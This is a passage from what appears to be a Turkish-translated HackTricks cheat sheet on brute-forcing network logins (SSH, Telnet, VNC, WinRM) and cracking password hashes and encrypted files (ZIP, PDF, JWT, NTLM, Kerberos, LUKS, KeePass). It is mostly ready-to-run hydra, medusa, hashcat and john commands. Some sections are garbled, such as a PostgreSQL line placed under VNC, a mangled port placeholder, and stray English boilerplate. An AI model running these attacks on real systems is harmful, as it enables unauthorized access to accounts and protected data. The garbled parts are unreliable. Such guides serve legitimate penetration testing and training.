legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
#### Zayıf SSH anahtarları / Debian tahmin edilebilir PRNG

Bazı sistemler, kriptografik materyal oluşturmak için kullanılan rastgele tohumda bilinen hatalara sahiptir. Bu, [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) gibi araçlarla kaba kuvvet saldırısına maruz kalan dramatik olarak azaltılmış bir anahtar alanı ile sonuçlanabilir. Önceden oluşturulmuş zayıf anahtar setleri de mevcuttur, örneğin [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

### STOMP (ActiveMQ, RabbitMQ, HornetQ ve OpenMQ)

STOMP metin protokolü, RabbitMQ, ActiveMQ, HornetQ ve OpenMQ gibi popüler mesaj sıralama hizmetleriyle sorunsuz iletişim ve etkileşim sağlayan yaygın olarak kullanılan bir iletişim protokolüdür. Mesajları değiş tokuş etmek ve çeşitli mesajlaşma işlemlerini gerçekleştirmek için standartlaştırılmış ve verimli bir yaklaşım sunar.
```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```
### Telnet

Telnet, ağ üzerindeki diğer cihazlara erişmek için kullanılan bir protokoldür. Brute force saldırıları genellikle zayıf şifrelerle korunan Telnet sunucularına karşı kullanılır. Saldırganlar, oturum açma ekranına erişmek için farklı şifre kombinasyonlarını deneyerek sisteme erişmeye çalışırlar. Bu saldırı türü, güvenlik açığına sahip sistemlere erişmek için etkili olabilir.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
--username admin \
--password wordlists/passwords.txt \
--target localhost:23 \
--telnet-user-prompt "login: " \
--telnet-pass-prompt "Password: " \
--telnet-prompt ":~$ " \
--single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```
### VNC

#### Brute Force

Brute force attacks against VNC servers involve attempting to log in by systematically trying all possible passwords until the correct one is found. This can be achieved using tools like Hydra or Medusa. It is important to note that brute force attacks can be time-consuming and resource-intensive, especially if the password is complex. It is recommended to use strong, unique passwords and implement additional security measures such as IP whitelisting or two-factor authentication to protect against brute force attacks.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm

Winrm, Windows Remote Management, Windows işletim sistemi üzerinde uzaktan yönetim sağlayan bir protokoldür. Winrm, Windows sunucuları ve istemcileri arasında güvenli iletişim kurmak için kullanılır. Winrm, PowerShell gibi araçlarla uzaktan komut çalıştırmak için yaygın olarak kullanılır.
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçlarıyla desteklenen **otomatik iş akışlarını** kolayca oluşturun ve otomatikleştirin.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Yerel

### Çevrimiçi kırma veritabanları

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 ve SHA1)
* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 ESS/SSP olmadan/ile ve herhangi bir meydan okuma değeri ile)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hash'ler, WPA2 yakalamaları ve arşivler MSOffice, ZIP, PDF...)
* [https://crackstation.net/](https://crackstation.net) (Hash'ler)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (Hash'ler ve dosya hash'leri)
* [https://hashes.org/search.php](https://hashes.org/search.php) (Hash'ler)
* [https://www.cmd5.org/](https://www.cmd5.org) (Hash'ler)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Hash'ı kaba kuvvet uygulamadan önce bunları kontrol edin.

### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### Bilinen düz metin zip saldırısı

Şifreli bir zip dosyasının içinde bulunan bir dosyanın **düz metnini (veya düz metnin bir kısmını)** bilmelisiniz. Şifreli bir zip içinde bulunan dosyaların **dosya adlarını ve dosyaların boyutunu** kontrol edebilirsiniz: **`7z l encrypted.zip`**\
İndirin [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) sürümler sayfasından.
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z

Brute-force attacks against encrypted 7z files can be performed using tools like **7z2hashcat** or **hashcat**. These tools can help you crack the password of a 7z file by trying all possible combinations until the correct one is found. This method can be time-consuming depending on the complexity of the password.
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
### PDF

Brute-force attacks are commonly used to crack passwords from PDF files. Tools like `pdfcrack` and `pdf2john` can be used to extract the hash from a PDF file, which can then be cracked using a password list or by brute-forcing the password. It is important to use strong and complex passwords to protect PDF files from brute-force attacks.
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### PDF Sahibi Şifresi

PDF Sahibi şifresini kırmak için şu adrese bakın: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### NTLM kırma
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
### Keepass
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Keberoasting

Keberoasting, bir hedefin Active Directory ortamında bulunan hesaplarının hash'lerini elde etmek için kullanılan bir saldırı tekniğidir. Bu saldırıda, saldırganlar genellikle SPN'leri (Service Principal Names) olan hesapları hedeflerler ve ardından bu hesapların hash'lerini elde etmek için brute force saldırıları gerçekleştirirler. Bu yöntem, zayıf şifreler kullanan hesapların hash'lerini elde etmek için etkili bir yol olabilir.
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Lucks görüntüsü

#### Yöntem 1

Yükle: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### Yöntem 2
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
Başka bir Luks BF öğretici: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### PGP/GPG Özel Anahtarı
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### DPAPI Anahtarını Kırmak

[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) adresini kullanın ve ardından john'u çalıştırın

### Open Office Şifre Korumalı Sütun

Eğer bir xlsx dosyasında bir sütun bir şifre ile korunuyorsa, şifreyi kaldırabilirsiniz:

* **Google Drive'a yükleyin** ve şifre otomatik olarak kaldırılacaktır
* **Manuel olarak** kaldırmak için:
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### PFX Sertifikaları
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçlarıyla desteklenen **otomatik iş akışlarını** kolayca oluşturun ve otomatikleştirin.\
Bugün Erişim Edinin:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Araçlar

**Hash örnekleri:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Hash-identifier
```bash
hash-identifier
> <HASH>
```
### Kelime Listeleri

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Kelime Listesi Oluşturma Araçları**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Yapılandırılabilir temel karakterler, tuş haritası ve rotalar ile gelişmiş klavye-tarama oluşturucusu.
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### John mutasyonu

_**/etc/john/john.conf**_ dosyasını okuyun ve yapılandırın
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Hashcat saldırıları

* **Kelime listesi saldırısı** (`-a 0`) kurallarla

**Hashcat**, zaten **kurallar içeren bir klasörle birlikte gelir** ancak [**burada başka ilginç kurallar bulabilirsiniz**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **Kelime listesi kombinasyonu** saldırısı

Hashcat ile **2 kelime listesi birleştirilebilir**.\
Eğer 1. liste **"hello"** kelimesini içeriyorsa ve ikinci liste **"world"** ve **"earth"** kelimelerini içeriyorsa, `helloworld` ve `helloearth` kelimeleri oluşturulacaktır.
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **Maske saldırısı** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* Kelime listesi + Maske (`-a 6`) / Maske + Kelime listesi (`-a 7`) saldırısı
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Hashcat modları
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
## Brute Forcing Linux Hashes

### Introduction

When it comes to cracking Linux hashes from the `/etc/shadow` file, brute force attacks are a common method used by hackers. Brute forcing involves systematically checking all possible passwords until the correct one is found.

### Methodology

1. **Obtain the Hash**: First, you need to obtain the hash from the `/etc/shadow` file. This can be done by gaining access to the file through various means.

2. **Choose a Tool**: Select a suitable password cracking tool that supports Linux hash cracking. Tools like John the Ripper, Hashcat, and Hydra are popular choices.

3. **Generate Wordlist**: Create a wordlist containing potential passwords. This can be a list of commonly used passwords, dictionary words, or a custom list based on the target's information.

4. **Initiate Brute Force Attack**: Use the chosen tool to start the brute force attack by providing the hash and the wordlist. The tool will systematically try each password until a match is found.

5. **Optimize**: Adjust the attack parameters such as password length, character sets, and rules to optimize the brute force attack and increase the chances of success.

6. **Crack the Hash**: Once the tool finds a matching password, the Linux hash is cracked, and the plaintext password is revealed.

### Conclusion

Brute forcing Linux hashes from the `/etc/shadow` file can be a time-consuming process, especially for complex passwords. However, with the right tools and techniques, hackers can successfully crack the hashes and gain unauthorized access to Linux systems.
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
# Brute Force

## Introduction

Brute force is a common technique used to crack passwords by systematically trying all possible combinations of characters until the correct one is found. In the context of cracking Windows hashes, brute force can be used to crack the LM and NTLM hashes of Windows user passwords.

## Tools

There are several tools available for performing brute force attacks on Windows hashes, including:

- **John the Ripper**: A popular password cracking tool that can be used to crack Windows hashes.
- **Hashcat**: Another powerful password cracking tool that supports cracking Windows hashes.
- **CrackMapExec**: A post-exploitation tool that can be used to perform brute force attacks on Windows systems.

## Methodology

The general methodology for cracking Windows hashes using brute force involves the following steps:

1. **Capture Hashes**: Obtain the LM and NTLM hashes from the Windows system.
2. **Select Tool**: Choose a suitable password cracking tool such as John the Ripper or Hashcat.
3. **Generate Wordlist**: Create a wordlist containing possible passwords to try.
4. **Perform Brute Force Attack**: Use the selected tool to systematically try all passwords from the wordlist until the correct one is found.
5. **Crack Hashes**: Once the correct password is found, use it to crack the LM and NTLM hashes.

By following this methodology, an attacker can successfully crack Windows hashes using brute force.
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
# Brute Force

## Brute Forcing Common Hashes

Brute forcing is a common technique used to crack hashes. It involves trying all possible combinations of characters until the correct one is found. This can be a time-consuming process, but it is often effective for cracking common application hashes.

### Tools

There are several tools available for brute forcing hashes, such as Hashcat, John the Ripper, and Hydra. These tools allow you to automate the process of trying different combinations of characters to crack the hash.

### Wordlists

Using wordlists can also be effective for brute forcing hashes. Wordlists contain commonly used passwords and can be used to quickly crack hashes without having to try every possible combination of characters.

### Custom Scripts

In some cases, you may need to write custom scripts to brute force hashes, especially if you are dealing with non-standard hash types or formats. Writing custom scripts allows you to tailor the brute forcing process to the specific hash you are trying to crack.

### Conclusion

Brute forcing is a powerful technique for cracking common application hashes. By using tools, wordlists, and custom scripts, you can automate and customize the brute forcing process to effectively crack hashes and gain access to protected information.
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><strong>Sıfırdan kahramana kadar AWS hackleme konusunda bilgi edinin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na (https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**]'yi (https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**]'i (https://opensea.io/collection/the-peass-family) içeren koleksiyonumuzu
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**]'i (https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın **en gelişmiş topluluk araçları** tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
